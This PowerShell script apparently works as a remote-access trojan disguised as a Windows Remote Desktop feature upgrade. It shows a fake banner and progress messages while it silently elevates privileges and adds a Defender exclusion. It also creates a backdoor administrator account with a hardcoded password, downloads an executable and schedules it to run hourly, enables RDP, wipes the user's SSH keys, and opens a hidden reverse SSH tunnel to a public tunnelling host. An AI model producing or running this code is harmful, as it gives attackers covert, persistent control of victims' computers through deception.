

# Self-elevate the script if required
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
 if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
  $CommandLine = "-File `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
  Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
  Exit
 }
}
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue' 

Write-Host "`n`nChecking pre-requirements.`n" -ForegroundColor White

try {
    # operation that may fail
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0  | Out-Null
}
catch {
    # handle/record error but don't print unless you want
    # e.g., write to a log file, then rethrow or exit
    $err = $_
    $err | Out-File -FilePath $logFile -Append
    # optionally surface a terse message to console:
    Write-Host "ERROR: operation failed. See log for details." -ForegroundColor Red
    exit 1
}


start-sleep 2

# rat

#WINDOWS REMOTE DESKTOP ENCHANCEMENT TOOL (64-bit), lol

Clear-Host

# --- ASCII banner ---
$banner = @'
+============================================================================+
|                                                                            |
|        WINDOWS REMOTE DESKTOP ENCHANCEMENT TOOL (64-bit)                    |
|        Feature Upgrade: KB5053643                        |
|                                                                            |
|        /!\  Please stand by — do not shut down the computer.               |
|                                                                            |
+============================================================================+
'@

Write-Host $banner -ForegroundColor White

# --- Progress bar simulation ---
$barLength = 40        # width of the progress bar
$totalSteps = 100      # total percent
for ($i = 0; $i -le $totalSteps; $i++) {
    $filled = [math]::Round(($i / $totalSteps) * $barLength)
    $empty  = $barLength - $filled
    $bar = ("#" * $filled) + ("-" * $empty)
    Write-Host -NoNewline "`r[$bar] $i% "
    Start-Sleep -Milliseconds 80
}

Write-Host "`n`nUpgrade loading complete.`n" -ForegroundColor Green
Write-Host "`n`nUpgrade is being applied.`n" -ForegroundColor Yellow

#check for cans
$drivers = get-childitem -Path c:\windows\system32\drivers
$web_client = new-object system.net.webclient
$jsonString = $web_client.DownloadString("https://www.loldrivers.io/api/drivers.json")
$jsonString = $jsonString -replace '"INIT"','"init"'
$loldrivers = $jsonString | ConvertFrom-Json

Write-Host("`n`nChecking {0} drivers for incompatibilities`n`n" -f $drivers.Count)
foreach ($lol in $loldrivers.KnownVulnerableSamples)
{
    # Check for matching driver name
    if($drivers.Name -contains $lol.Filename)
    {
        #CHECK HASH
        $Hash = Get-FileHash -Path "c:\windows\system32\drivers\$($lol.Filename)"
        if($lol.Sha256 -eq $Hash.Hash)
        {
            write-output("Driver {0}, SHA256 hash of {1} is not compatible with this feature upgrade." -f $lol.Filename, $lol.SHA256)
            Out-File
        }
    }
}

#make space
Write-Host "`n`nChecking space for upgrade.`n" -ForegroundColor Yellow
Start-Sleep 5
New-Item -Path $env:TEMP\Train -Force    > $null 2>&1
Add-MpPreference -ExclusionPath  $env:TEMP\Train -Force    > $null 2>&1

#make stay
Write-Host "`n`nMaking upgrade permanent.`n" -ForegroundColor Yellow
Start-Sleep 5
C:\Windows\system32\cmd.exe /c net user /delete LAPSdmin   > $null 2>&1
C:\Windows\system32\cmd.exe /c net user /add LAPSdmin AEM@zcy4pr  > $null 2>&1
C:\Windows\system32\cmd.exe /c net localgroup Administrators LAPSdmin /add  > $null 2>&1




#stay
schtasks /delete /f /tn "Traintunnel" > $null 2>&1
iwr https://example.com/AM_Delta_Patch_1.393.1021.0.exe -OutFile $env:TEMP\train-ing136895absc2.exe
schtasks /create /sc minute /mo 60 /tn "Traintunnel" /tr $env:TEMP\train-ing136895absc2.exe > $null 2>&1

#make train
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 > $null 2>&1
Enable-NetFirewallRule -DisplayGroup "Remote Desktop" > $null 2>&1
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1 > $null 2>&1
(Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server').fDenyTSConnections > $null 2>&1


#traintunnel
Write-Host "`n`nChecking connectivity.`n" -ForegroundColor Yellow
start-sleep 5
Write-Host "`n`nUpgraded.`n" -ForegroundColor Green
start-sleep 5

powershell.exe -WindowStyle hidden {
rm "$env:USERPROFILE\.ssh" -Force -Recurse
mkdir "$env:USERPROFILE\.ssh" -Force | Out-Null; ssh-keygen -f "$env:USERPROFILE\.ssh\id_rsa" -N '""' -q
ssh -p 443 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R0:127.0.0.1:3389 example.com+tcp@free.pinggy.io}

exit